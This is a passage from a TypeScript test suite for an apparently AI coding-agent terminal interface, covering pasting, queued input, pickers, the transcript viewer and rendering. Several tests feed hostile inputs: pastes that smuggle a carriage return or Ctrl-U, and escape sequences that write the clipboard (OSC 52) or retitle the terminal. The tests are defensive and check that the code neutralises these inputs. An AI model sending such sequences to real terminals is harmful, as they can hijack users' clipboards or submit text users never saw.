  it('does not wipe the visible draft from a smuggled Ctrl-U', async () => {
    // Ctrl-U would hide the payload by clearing what the user can see, so the
    // text they review is not the text that gets sent.
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}visible payload${END}\x15${END}`)
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toContain('visible payload')
  })

  it('strips escape sequences from a paste rather than echoing them back', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}safe\x07\x1b]0;pwn\x07text${END}`)
    t.tick()
    t.stdin.push('\r')
    const got = (await read) as string
    expect(got).toContain('safe')
    expect(got).not.toContain('\x1b')
    expect(got).not.toContain('\x07')
  })

  it('lets a real keystroke through once the paste burst is over', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}context${END}`)
    t.tick() // the human pauses, then types and sends
    t.stdin.push(' please review')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('context please review')
  })
})

/**
 * A bell for something you are already watching is nuisance, and a nuisance bell
 * is one people turn off — so the alert is gated on the terminal telling us it
 * lost focus. The subtlety is terminals that never report at all.
 */
describe('signal (attention) — focus gating', () => {
  function harness() {
    const stdin = fakeTty()
    const written: string[] = []
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80
    })
    return { io, stdin, text: () => written.join(''), clear: () => (written.length = 0) }
  }
  const alert = { title: 'Houston', body: 'Finished' }

  it('always sets the title — it is ambient, not an interruption', () => {
    const t = harness()
    t.io.signal!({ title: 'working' })
    expect(t.text()).toBe('\x1b]0;working\x07')
  })

  // A terminal with no focus reporting never tells us anything; reading that
  // silence as "focused" would silently disable every signal on those terminals.
  it('alerts when focus is unknown, rather than staying silent', () => {
    const t = harness()
    t.io.signal!({ alert })
    expect(t.text()).toContain('\x07')
    expect(t.text()).toContain(']9;')
  })

  it('stays quiet once the terminal reports the window IS focused', () => {
    const t = harness()
    t.io.startSpinner!('Working') // arms the watcher, which enables focus reporting
    t.stdin.push('\x1b[I')
    t.clear()
    t.io.signal!({ alert })
    expect(t.text()).not.toContain(']9;')
  })

  it('alerts once the terminal reports the window lost focus', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('\x1b[I')
    t.stdin.push('\x1b[O')
    t.clear()
    t.io.signal!({ alert })
    expect(t.text()).toContain(']9;')
    expect(t.text()).toContain(']777;notify;')
  })

  it('asks the terminal to report focus while a turn runs, and stops asking after', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    expect(t.text()).toContain('[?1004h')
    t.clear()
    t.io.stopSpinner!()
    expect(t.text()).toContain('[?1004l')
  })

  it('tracks focus reported while the user is at the composer', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b[O') // they switched away mid-draft
    t.clear()
    t.io.signal!({ alert })
    expect(t.text()).toContain(']9;')
    t.stdin.push('\r')
    await read
  })
})

describe('pickerPhysicalRows', () => {
  it('counts wrapped rows, not just logical lines', () => {
    // At width 4, "aaaaaa" (6 cols) wraps to 2 rows; the others fit in 1 each.
    expect(pickerPhysicalRows(['ab', 'aaaaaa', 'cd'], 4)).toBe(4)
  })

  it('is the logical line count when nothing wraps', () => {
    expect(pickerPhysicalRows(['ab', 'cd', 'ef'], 80)).toBe(3)
  })

  it('treats an empty line as one row and a full-width line as one row', () => {
    expect(pickerPhysicalRows(['', 'abcd'], 4)).toBe(2)
  })

  it('falls back to the logical count when the width is unknown (0)', () => {
    expect(pickerPhysicalRows(['ab', 'aaaaaa'], 0)).toBe(2)
  })
})

/**
 * Typing while the agent works used to be dropped on the floor: a thought you had
 * mid-run had to be held in your head until the turn ended, or forced through an
 * interrupt that threw the turn away.
 */
describe('mid-run input', () => {
  function harness() {
    const stdin = fakeTty()
    const written: string[] = []
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => clock,
      schedule: () => () => {} // no timer: draw only when input arrives
    })
    return { io, stdin, text: () => written.join(''), tick: (ms = 500) => (clock += ms) }
  }

  it('Shift-Tab while a turn runs cycles the approval mode', () => {
    const t = harness()
    let cycles = 0
    t.io.onCycleMode!(() => cycles++)
    t.io.startSpinner!('Working')
    t.stdin.push('\x1b[Z')
    expect(cycles).toBe(1)
    // Not typed into the draft.
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual([])
  })

  it('keeps the status on the spinner line, dropping it before the line would wrap', () => {
    const t = harness()
    t.io.setStatus!('claude · main · 30%')
    t.io.startSpinner!('Working')
    t.stdin.push('x')
    expect(t.text()).toContain('claude · main · 30%')
    t.stdin.push('y'.repeat(70)) // the draft now fills the 80-column line
    const last = t.text().split('\x1b[2K').at(-1)!
    expect(last).not.toContain('claude · main')
    expect(last).toContain('yyyy')
  })

  // A wrapped spinner line can't be erased in place: each frame left another copy of
  // the row above it on screen.
  it('cuts a long draft from the left, so the spinner line never wraps', () => {
    const t = harness()
    t.io.setMode!('auto-edit')
    t.io.startSpinner!('Working')
    for (const c of 'please also update the changelog and the readme when you are done with this') t.stdin.push(c)
    const frames = t.text().split('\x1b[2K').slice(1)
    expect(frames.length).toBeGreaterThan(70)
    for (const f of frames) expect(visibleWidth(f.replace(CSI_MOVES, ''))).toBeLessThanOrEqual(79)
    const last = frames.at(-1)!.replace(CSI_MOVES, '')
    expect(last).toContain('› …') // the start is what goes
    expect(last.endsWith('when you are done with this')).toBe(true) // the end, where you type, stays
    expect(last).toContain('[auto-edit]')
  })

  it('queues what is typed while a turn runs, and hands it over at the end', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('also update the docs')
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual(['also update the docs'])
  })

  it('queues several follow-ups in order', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('first\r')
    t.stdin.push('second\r')
    expect(t.io.takeQueued!()).toEqual(['first', 'second'])
  })

  it('shows the draft and the queue count on the spinner line', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('queued one\r')
    t.stdin.push('typing')
    const out = t.text()
    expect(out).toContain('(1 queued)')
    expect(out).toContain('typing')
  })

  it('edits the draft with backspace, and Ctrl-U clears it', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('abc')
    t.stdin.push('\x7f') // backspace
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual(['ab'])

    t.io.startSpinner!('Working')
    t.stdin.push('discard me')
    t.stdin.push('\x15') // Ctrl-U
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual([])
  })

  // A line still being typed when the turn ends was thrown away with the queue.
  it('keeps a half-typed line for the next composer, apart from the queue', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('sent\r')
    t.stdin.push('still typing')
    expect(t.io.takeQueued!()).toEqual(['sent'])
    expect(t.io.takeDraft!()).toBe('still typing')
    expect(t.io.takeDraft!()).toBe('')
  })

  it('ignores an empty Enter', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual([])
  })

  it('Esc clears a draft, and stops the run when there is nothing to clear', () => {
    const t = harness()
    let interrupts = 0
    t.io.onInterrupt?.(() => interrupts++)
    t.io.startSpinner!('Working')

    t.stdin.push('half a thought')
    t.stdin.push('\x1b')
    expect(interrupts).toBe(0) // it cleared the draft, not the turn
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual([])

    t.stdin.push('\x1b') // now the line is empty: stop the run
    expect(interrupts).toBe(1)
  })

  it('still interrupts on Ctrl-C', () => {
    const t = harness()
    let interrupts = 0
    t.io.onInterrupt?.(() => interrupts++)
    t.io.startSpinner!('Working')
    t.stdin.push('\x03')
    expect(interrupts).toBe(1)
  })

  it('flattens a pasted block onto the one-line draft', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('\x1b[200~one\ntwo\x1b[201~')
    t.tick()
    t.stdin.push('\r')
    expect(t.io.takeQueued!()).toEqual(['one two'])
  })

  // A paste is as untrusted here as in the composer: its tail must not submit.
  it('does not let a hostile paste queue itself', () => {
    const t = harness()
    t.io.startSpinner!('Working')
    t.stdin.push('\x1b[200~payload\x1b[201~\r\x1b[201~')
    expect(t.io.takeQueued!()).toEqual([]) // the CR became part of the draft, not a submit
  })
})

describe('the live command menu', () => {
  function harness(menuFor?: (line: string) => string[]) {
    const stdin = fakeTty()
    const written: string[] = []
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      ...(menuFor ? { menuFor } : {})
    })
    return { io, stdin, text: () => written.join('') }
  }

  it('shows the menu under the composer as you type', async () => {
    const t = harness((line) => (line.startsWith('/') ? ['  /help   list commands'] : []))
    const read = t.io.readComposer!('> ')
    t.stdin.push('/')
    expect(t.text()).toContain('/help   list commands')
    t.stdin.push('\r')
    await read
  })

  // The redraw moves up by the rows it drew; a menu row wider than the screen wrapped
  // onto an extra row, and every keystroke then left a stale prompt line behind.
  it('cuts a menu row wider than the screen to fit on one row', async () => {
    const wide = `  /proposals  ${'List the sessions the agent proposed, '.repeat(3)}`
    const t = harness((line) => (line.startsWith('/') ? [wide, '  /help   list commands'] : []))
    const read = t.io.readComposer!('> ')
    t.stdin.push('/p')
    const region = t.text().slice(t.text().lastIndexOf('\x1b[0J') + '\x1b[0J'.length)
    const rows = region.replace(CSI_MOVES, '').split('\n')
    expect(rows).toHaveLength(3) // the prompt and the two menu rows, nothing wrapped
    for (const r of rows) expect(visibleWidth(r)).toBeLessThanOrEqual(79)
    expect(rows[1]).toContain('/proposals')
    expect(rows[1].endsWith('…')).toBe(true)
    t.stdin.push('\r')
    await read
  })

  it('keeps the menu out of the submitted message', async () => {
    const t = harness(() => ['  /help   list commands'])
    const read = t.io.readComposer!('> ')
    t.stdin.push('/help')
    t.stdin.push('\r')
    // The menu is decoration under the composer, never part of the buffer.
    await expect(read).resolves.toBe('/help')
  })

  it('drops the menu once the line stops being a command', async () => {
    const t = harness((line) => (line === '/h' ? ['  /help   list commands'] : []))
    const read = t.io.readComposer!('> ')
    t.stdin.push('/h')
    expect(t.text()).toContain('/help')
    t.stdin.push('i there')
    // The rows are erased with the rest of the region on the next redraw.
    t.stdin.push('\r')
    await expect(read).resolves.toBe('/hi there')
  })

  it('works with no menu wired at all', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('plain\r')
    await expect(read).resolves.toBe('plain')
  })
})

// The adapter draws the spinner, the picker, the composer's marks and the menus
// itself. Its painter was always the default theme, so /theme mono (or light, or the
// detected light background) never reached them, and mono still drew colour.
describe('the session theme', () => {
  /** Draw each part the adapter paints, returning what was written. */
  async function drawEverything(setTheme?: 'mono') {
    const stdin = fakeTty()
    const written: string[] = []
    let frame = (): void => {}
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      rows: () => 24,
      now: () => clock,
      paint: makePainter(true),
      schedule: (fn) => {
        frame = fn
        return () => {}
      },
      editorMode: () => 'vim',
      menuFor: (line, _redraw, paint) =>
        line.startsWith('/') ? renderCommandMenu([{ name: 'help', description: 'list commands' }], paint as never) : []
    })
    if (setTheme) io.setPaint!(makePainter(true, setTheme))
    // The spinner, with a draft and a queued message.
    io.startSpinner!('Working')
    stdin.push('one\r')
    stdin.push('two')
    frame()
    io.stopSpinner!()
    // The composer: the ultrathink mark and hint, the vim marker in normal mode, the menu.
    const read = io.readComposer!('> ', undefined, { ultrathinkEffect: () => 'raises' })
    stdin.push('ultrathink')
    clock += 500
    stdin.push(ESC) // normal mode
    stdin.push('cc') // change the whole line: back to insert, empty
    stdin.push('/h')
    stdin.push('\r')
    await read
    // The picker's highlighted option.
    const picked = io.select!({ title: 'Choose:', options: [{ label: 'A', value: 'a' }] })
    stdin.push('\r')
    await picked
    return written.join('')
  }

  it('draws in colour by default, and none of it once the theme is mono', async () => {
    const coloured = await drawEverything()
    expect(coloured).toMatch(COLOUR)
    const mono = await drawEverything('mono')
    expect(mono).not.toMatch(COLOUR)
    // The same parts were drawn, just without colour.
    for (const part of ['Working', '(1 queued)', 'ultrathink', 'N ', '/help', '› A']) expect(stripSgr(mono)).toContain(part)
  })
})


describe('marksByLine', () => {
  it('maps ranges over the joined draft onto the line that holds them', () => {
    const lines = ['fix it', 'ultrathink please', 'and ultrathink']
    const text = lines.join('\n')
    const ranges = [
      { start: text.indexOf('ultrathink'), end: text.indexOf('ultrathink') + 10 },
      { start: text.lastIndexOf('ultrathink'), end: text.lastIndexOf('ultrathink') + 10 }
    ]
    expect(marksByLine(lines, ranges)).toEqual([[], [{ start: 0, end: 10 }], [{ start: 4, end: 14 }]])
  })

  it('gives every line an entry when nothing is marked', () => {
    expect(marksByLine(['a', 'b'], [])).toEqual([[], []])
  })
})

describe('sub-prompts and the picker after the composer', () => {
  it('readLine puts the terminal back in raw mode before asking', async () => {
    // The composer turns raw mode off on its way out, and readline only sets it in
    // its constructor: a cooked [y/N] prompt echoed every key twice, and Ctrl-C was
    // a real SIGINT that killed the process.
    const stdin = fakeTty()
    const f = fakeRl()
    const setRaw = stdin.setRawMode.bind(stdin)
    stdin.setRawMode = ((on: boolean) => {
      f.calls.push(`raw:${on}`)
      return setRaw(on)
    }) as typeof stdin.setRawMode
    const io = createTerminalIo({ stdin, createInterface: () => f.rl, write: () => {}, columns: () => 80, now: () => 1000 })
    const composed = io.readComposer!('> ')
    stdin.push('/delete\r')
    await expect(composed).resolves.toBe('/delete')
    expect(f.calls.filter((c) => c.startsWith('raw:')).at(-1)).toBe('raw:false') // the composer handed it back cooked
    const answer = io.readLine('Delete? [y/N] ')
    const before = f.calls.slice(0, f.calls.lastIndexOf('question'))
    expect(before.length).toBeGreaterThan(0)
    expect(before.lastIndexOf('raw:true')).toBeGreaterThan(before.lastIndexOf('raw:false'))
    f.submit('y')
    await expect(answer).resolves.toBe('y')
  })

  it('the picker keeps readline from walking its history on Up/Down', async () => {
    const stdin = fakeTty()
    const rlOut = new PassThrough()
    const echoed: string[] = []
    rlOut.on('data', (c: Buffer) => echoed.push(c.toString()))
    const written: string[] = []
    const io = createTerminalIo({
      stdin,
      createInterface: () =>
        createInterface({
          input: stdin,
          output: rlOut,
          terminal: true,
          history: ['an old message from history']
        }) as unknown as ReadlineLike,
      write: (s) => written.push(s),
      columns: () => 80
    })
    const picked = io.select!({
      title: 'Pick',
      options: [
        { label: 'One', value: 'a' },
        { label: 'Two', value: 'b' }
      ]
    })
    // Up then Down twice lands on the second option whether the cursor clamps or wraps.
    stdin.push('\x1b[A')
    stdin.push('\x1b[B')
    stdin.push('\x1b[B')
    stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: 'b' })
    expect(echoed.join('')).not.toContain('an old message from history')
    // Each redraw starts from column 0, wherever the cursor was left.
    expect(written.join('')).toMatch(new RegExp(`\r${String.fromCharCode(27)}\\[\\d+A`))
    // readline's own listener is back for the next read.
    expect(stdin.listenerCount('keypress')).toBeGreaterThan(0)
  })

  it('a filtering picker takes typed keys, Backspace and Ctrl actions in order', async () => {
    const stdin = fakeTty()
    const written: string[] = []
    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: (s) => written.push(s), columns: () => 80 })
    const acted: string[] = []
    const picked = io.select!({
      title: 'Sessions',
      filter: true,
      actions: [{ id: 'rename', keys: ['ctrl-r'], input: { label: 'new title' } }],
      onAction: async (req) => {
        acted.push(`${req.value}:${req.text}`)
        return { notice: 'renamed' }
      },
      options: [
        { label: 'Alpha', value: 'a' },
        { label: 'Beta', value: 'b' }
      ]
    })
    stdin.push('bx')
    stdin.push('\x7f') // Backspace: the filter is "b" again
    stdin.push('\x12') // Ctrl-R on Beta
    stdin.push('Z\r')
    stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: 'b' })
    expect(acted).toEqual(['b:Z'])
    expect(written.join('')).toContain('filter: bx')
    expect(written.join('')).toContain('· renamed')
  })

  // A /resume row is a chat title, its preview is the chat's own text, and an ask_user
  // row is the model's answer: whatever the picker renders passes the output filter
  // like every other write, so a preview line it didn't clean can't drive the terminal.
  it('a picker filters its rows and preview before drawing them', async () => {
    const stdin = fakeTty()
    const written: string[] = []
    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: (s) => written.push(s), columns: () => 80 })
    const picked = io.select!({
      title: 'Sessions',
      filter: true,
      preview: () => ['  last reply \x1b]52;c;cGF5\x07done'],
      options: [
        { label: 'Fix \x1b]0;pwned\x07auth', value: 'a' },
        { label: 'Beta', value: 'b' }
      ]
    })
    stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: 'a' })
    const out = written.join('')
    expect(out).not.toContain('\x1b]52')
    expect(out).not.toContain('\x1b]0;')
    expect(out).toContain('last reply <U+001B>]52;c;cGF5<U+0007>done')
    expect(out).toContain('Fix ]0;pwnedauth') // the picker cleans its own rows first
  })

  function pickerHarness(rows = 12) {
    const stdin = fakeTty()
    const written: string[] = []
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 60,
      rows: () => rows,
      now: () => 1000
    })
    return { io, stdin, written, text: () => written.join('') }
  }
  const models = Array.from({ length: 40 }, (_, i) => ({
    label: i % 3 === 0 ? `gpt-${i}` : `claude-${i}`,
    value: String(i),
    description: i % 3 === 0 ? 'OpenAI' : 'Anthropic'
  }))

  /** Let the picker's queued key handling run. */
  const settle = (): Promise<void> => new Promise((r) => setImmediate(r))

  // The redraw moves up over the picker, and can't move past the top of the screen: a
  // list taller than the screen copied its top into the scrollback on every arrow press.
  // The window's height comes from the terminal's real row count.
  it('the picker scrolls a list taller than the screen in a window that fits it', async () => {
    const t = pickerHarness(12)
    const picked = t.io.select!({ title: 'Model:', filter: true, options: models })
    for (let i = 0; i < 15; i++) {
      t.stdin.push('\x1b[B')
      await settle()
    }
    const frames = t.text().split(PICKER_REDRAW)
    expect(frames).toHaveLength(16) // the first draw and one redraw per arrow
    for (const f of frames) expect(f.split('\n').length - 1).toBeLessThanOrEqual(11)
    for (const up of t.text().matchAll(CURSOR_UP)) expect(Number(up[1])).toBeLessThanOrEqual(11)
    const last = frames.at(-1)!
    expect(last).toContain('› gpt-15')
    expect(last).toMatch(/↑ \d+ more/)
    expect(last).toMatch(/↓ \d+ more/)
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: '15' })
  })

  // An approval, ask_user or plan review is a plain picker, and needs the same window.
  it('a plain picker also scrolls a list taller than the screen in a window that fits it', async () => {
    const t = pickerHarness(12)
    const picked = t.io.select!({ title: 'Which?', options: models })
    for (let i = 0; i < 15; i++) {
      t.stdin.push('\x1b[B')
      await settle()
    }
    const frames = t.text().split(PICKER_REDRAW)
    expect(frames).toHaveLength(16)
    for (const f of frames) expect(f.split('\n').length - 1).toBeLessThanOrEqual(11)
    for (const up of t.text().matchAll(CURSOR_UP)) expect(Number(up[1])).toBeLessThanOrEqual(11)
    const last = frames.at(-1)!
    expect(last).toContain('› gpt-15')
    expect(last).toMatch(/↑ \d+ more/)
    expect(last).toMatch(/↓ \d+ more/)
    expect(last).toContain('type for a custom answer') // still the plain picker's footer
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: '15' })
  })

  it('a filtering picker narrows as you type, where another hands off to typing', async () => {
    const t = pickerHarness()
    const picked = t.io.select!({ title: 'Model:', filter: true, options: models })
    for (const k of ['g', 'p', 't', '\x1b[B']) {
      t.stdin.push(k) // the last: Down to the second match
      await settle()
    }
    expect(t.text().split(PICKER_REDRAW).at(-1)).toContain('filter: gpt')
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: '3' })

    const t2 = pickerHarness()
    const plain = t2.io.select!({ title: 'Choose:', options: models.slice(0, 3) })
    t2.stdin.push('g')
    await expect(plain).resolves.toEqual({ kind: 'type' })
  })

  // Printed above an open picker, a notice goes through the same output filter as
  // every other write, so it can't write the clipboard or retitle the terminal.
  it('filters output printed above an open picker', async () => {
    const t = pickerHarness()
    const picked = t.io.select!({ title: 'Choose:', options: models.slice(0, 3) })
    const mark = t.text().length
    t.io.out('\n· session "x\x1b]52;c;cGF5\x07" finished\n')
    const after = t.text().slice(mark)
    expect(after).not.toContain('\x1b]52')
    expect(after).toContain('<U+001B>]52;c;cGF5<U+0007>')
    expect(after).toContain('› gpt-0')
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: '0' })
  })

  it('prints output that arrives while the picker is open above it, and draws the picker again', async () => {
    const t = pickerHarness()
    const picked = t.io.select!({ title: 'Choose:', options: models.slice(0, 3) })
    const mark = t.text().length
    t.io.out('\n· background session "fix tests" finished\n')
    const after = t.text().slice(mark)
    const notice = after.indexOf('· background session')
    // The picker (its footer wraps at 60 columns: six rows) is erased first.
    expect(after.slice(0, notice).startsWith('\r\x1b[6A\x1b[0J')).toBe(true)
    expect(after.slice(notice)).toContain('› gpt-0') // and drawn again below
    t.stdin.push('\r')
    await expect(picked).resolves.toEqual({ kind: 'commit', value: '0' })
  })

  it('the composer joins a character split across two reads', async () => {
    const stdin = fakeTty()
    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: () => {}, columns: () => 80, now: () => 1000 })
    const read = io.readComposer!('> ')
    const bytes = Buffer.from('café')
    stdin.push(bytes.subarray(0, bytes.length - 1))
    stdin.push(bytes.subarray(bytes.length - 1))
    stdin.push('\r')
    await expect(read).resolves.toBe('café')
  })

  it('the mid-run watcher joins a character split across two reads', () => {
    const stdin = fakeTty()
    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: () => {}, columns: () => 80, now: () => 1000 })
    io.startSpinner!('Working')
    const bytes = Buffer.from('é')
    stdin.push(bytes.subarray(0, 1))
    stdin.push(bytes.subarray(1))
    stdin.push('\r')
    expect(io.takeQueued!()).toEqual(['é'])
    io.stopSpinner!()
  })
})

describe('the transcript viewer (pager)', () => {
  const ALT_ON = '\x1b[?1049h'
  const ALT_OFF = '\x1b[?1049l'
  const flush = (): Promise<void> => new Promise((r) => setImmediate(r))
  const source = (widths: number[] = []): PagerSource => ({
    title: 'My chat',
    render: (width) => {
      widths.push(width)
      return { lines: Array.from({ length: 50 }, (_, i) => `doc line ${i}`), prompts: [0, 20] }
    },
    plain: () => 'the whole transcript'
  })
  function harness(over: Parameters<typeof createTerminalIo>[0] = {}) {
    const stdin = fakeTty()
    const written: string[] = []
    let resize: (() => void) | null = null
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      rows: () => 10,
      now: () => 1000,
      onResize: (l) => {
        resize = l
        return () => {
          resize = null
        }
      },
      ...over
    })
    return {
      io,
      stdin,
      written,
      text: () => written.join(''),
      resize: () => resize?.()
    }
  }

  it('opens on the alternate screen at the end of the session, and q leaves it', async () => {
    const t = harness()
    const open = t.io.pager!(source())
    expect(t.text()).toContain(ALT_ON)
    // The last screenful: 9 document rows above the status line.
    expect(t.text()).toContain('doc line 49')
    expect(t.text()).not.toContain('doc line 40')
    t.stdin.push('g')
    expect(t.text()).toContain('doc line 0')
    t.stdin.push('q')
    await expect(open).resolves.toBe(true)
    expect(t.text().lastIndexOf(ALT_OFF)).toBeGreaterThan(t.text().lastIndexOf(ALT_ON))
    // Raw mode on while open, back off after.
    expect(t.stdin.rawModes.at(-1)).toBe(false)
  })

  it('does not open without a terminal', async () => {
    const stdin = new PassThrough() as unknown as NodeJS.ReadStream
    const io = createTerminalIo({ stdin, createInterface: () => fakeRl().rl, write: () => {} })
    await expect(io.pager!(source())).resolves.toBe(false)
  })

  it('Ctrl-O at the composer opens it and brings the draft back exactly as it was', async () => {
    const t = harness()
    let opened = 0
    t.io.onTranscript!(async (during) => {
      expect(during).toBe('composer')
      opened++
      await t.io.pager!(source())
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('half a thought')
    // Cursor left of "thought", so a restored cursor shows in where the next key lands.
    t.stdin.push('\x1bb')
    t.stdin.push('\x0f')
    await flush()
    expect(opened).toBe(1)
    expect(t.text()).toContain(ALT_ON)
    t.stdin.push('\x1b') // Esc closes it too
    await flush()
    expect(t.text()).toContain(ALT_OFF)
    t.stdin.push('whole ')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('half a whole thought')
  })

  it('rewraps at the new size when the terminal is resized while open', async () => {
    let cols = 80
    const widths: number[] = []
    const t = harness({ columns: () => cols })
    const open = t.io.pager!(source(widths))
    cols = 40
    t.resize()
    expect(widths).toEqual([79, 39])
    t.stdin.push('q')
    await open
  })

  // The viewer owns the screen, so it is checked before an open composer: a notice
  // landing while it is open waits, then goes above the composer once both are back.
  it('holds output while open over the composer, then prints it above the redrawn draft', async () => {
    const t = harness()
    t.io.onTranscript!(async () => {
      await t.io.pager!(source())
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('draft')
    t.stdin.push('\x0f')
    await flush()
    const opened = t.text().length
    t.io.out('· background session finished\n')
    expect(t.text().slice(opened)).not.toContain('background session') // nothing on the alternate screen
    t.stdin.push('q')
    await flush()
    const after = t.text().slice(t.text().lastIndexOf(ALT_OFF))
    const notice = after.indexOf('· background session finished')
    expect(notice).toBeGreaterThan(-1)
    expect(after.indexOf('> draft', notice)).toBeGreaterThan(notice) // the composer is drawn again under it
    t.stdin.push('\r')
    await expect(read).resolves.toBe('draft')
  })

  it('holds output that arrives while it is open, then prints it in order', async () => {
    const t = harness()
    const open = t.io.pager!(source())
    t.io.out('first\n')
    t.io.out('second\n')
    expect(t.text()).not.toContain('first')
    t.stdin.push('q')
    await open
    const out = t.text()
    expect(out.indexOf('first')).toBeGreaterThan(out.lastIndexOf(ALT_OFF))
    expect(out.indexOf('second')).toBeGreaterThan(out.indexOf('first'))
  })

  it('keeps a background turn from closing the composer under it', async () => {
    const t = harness()
    t.io.onTranscript!(async () => {
      // A wake arriving now must wait: the composer is not idle, it is behind the viewer.
      const open = t.io.pager!(source())
      expect(t.io.yieldComposer!()).toBe(false)
      t.stdin.push('q')
      await open
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x0f')
    await flush()
    await flush()
    expect(t.io.yieldComposer!()).toBe(true)
    await expect(read).resolves.toBeNull()
  })

  it('v hands the transcript to the editor and comes back to the viewer', async () => {
    const viewed: string[] = []
    const t = harness({
      viewText: async (text) => {
        viewed.push(text)
        return true
      }
    })
    const open = t.io.pager!(source())
    t.stdin.push('v')
    await flush()
    expect(viewed).toEqual(['the whole transcript'])
    // Left the alternate screen for the editor, then came back to it.
    const out = t.text()
    expect(out.indexOf(ALT_OFF)).toBeGreaterThan(-1)
    expect(out.lastIndexOf(ALT_ON)).toBeGreaterThan(out.indexOf(ALT_OFF))
    t.stdin.push('q')
    await open
  })

  it('v says how to get an editor when none is set', async () => {
    const t = harness({ viewText: async () => false })
    const open = t.io.pager!(source())
    t.stdin.push('v')
    await flush()
    expect(t.text()).toContain('set $VISUAL or $EDITOR')
    t.stdin.push('q')
    await open
  })

  it('mid-run, Ctrl-O and Alt-T go to the driver, which decides', () => {
    const t = harness()
    const seen: string[] = []
    t.io.onTranscript!(async (during) => void seen.push(`transcript:${during}`))
    t.io.onCycleThoughts!(() => seen.push('thoughts'))
    t.io.startSpinner!('Working')
    t.stdin.push('\x0f')
    t.stdin.push('\x1bt')
    expect(seen).toEqual(['transcript:run', 'thoughts'])
    t.io.stopSpinner!()
  })

  it('Alt-T at the composer lets the driver print its note, then redraws the draft', async () => {
    const t = harness()
    t.io.onCycleThoughts!(() => t.io.out('· thoughts: hidden\n'))
    const read = t.io.readComposer!('> ')
    t.stdin.push('draft')
    t.stdin.push('\x1bt')
    const out = t.text()
    expect(out.lastIndexOf('draft')).toBeGreaterThan(out.indexOf('· thoughts: hidden'))
    t.stdin.push('\r')
    await expect(read).resolves.toBe('draft')
  })
})

describe('synchronized output (DEC 2026)', () => {
  const count = (s: string, sub: string): number => s.split(sub).length - 1
  function harness(syncOutput?: boolean) {
    const stdin = fakeTty()
    const written: string[] = []
    let ticks: Array<() => void> = []
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => 1000,
      schedule: (fn) => {
        ticks.push(fn)
        return () => {
          ticks = ticks.filter((t) => t !== fn)
        }
      },
      ...(syncOutput === undefined ? {} : { syncOutput })
    })
    return { io, stdin, written, text: () => written.join(''), tick: () => ticks.forEach((fn) => fn()) }
  }

  it('paints each composer redraw atomically, always closing what it opens', async () => {
    const t = harness(true)
    const read = t.io.readComposer!('> ')
    t.stdin.push('abc')
    t.stdin.push('\x0c') // Ctrl-L: a clear and a redraw, several writes in one repaint
    t.stdin.push('\r')
    await read
    const out = t.text()
    expect(count(out, SYNC_BEGIN)).toBeGreaterThan(2)
    expect(count(out, SYNC_BEGIN)).toBe(count(out, SYNC_END))
    // Never nested: each begin is closed before the next opens.
    let depth = 0
    // eslint-disable-next-line no-control-regex -- matching the markers is the point
    for (const m of out.matchAll(/\x1b\[\?2026([hl])/g)) {
      depth += m[1] === 'h' ? 1 : -1
      expect(depth === 0 || depth === 1).toBe(true)
    }
    expect(depth).toBe(0)
  })

  it('paints the spinner and status line atomically', () => {
    const t = harness(true)
    t.io.startSpinner!('Working')
    t.io.setStatus!('model · main')
    t.tick()
    const out = t.text()
    expect(out).toContain(`${SYNC_BEGIN}\r\x1b[2K`)
    expect(count(out, SYNC_BEGIN)).toBe(count(out, SYNC_END))
